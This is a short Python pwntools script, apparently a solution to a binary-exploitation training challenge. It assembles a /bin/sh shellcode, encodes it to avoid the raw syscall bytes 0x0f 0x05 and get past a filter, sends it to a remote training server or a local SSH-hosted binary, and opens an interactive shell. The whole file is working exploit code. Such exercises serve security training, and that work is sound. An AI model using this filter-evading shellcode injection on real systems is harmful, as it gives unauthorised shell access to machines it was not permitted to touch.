from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
        s = ssh(host='localhost',user='acidburn',port=2222)
        r= s.process('/home/acidburn/Desktop/malicious/shell/5/syscall')
        pid=gdb.attach(r)
        input("wait")
else:
        r=remote("bin.training.jinblack.it",3102)




#sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","syscaslr.c"])
sc= shellcraft.sh()

sc=asm(sc)

sc_encoded=pwnlib.encoders.encoder.encode(sc,b'\x0f\x05')

shellcode = sc_encoded




r.send(shellcode)

r.interactive()

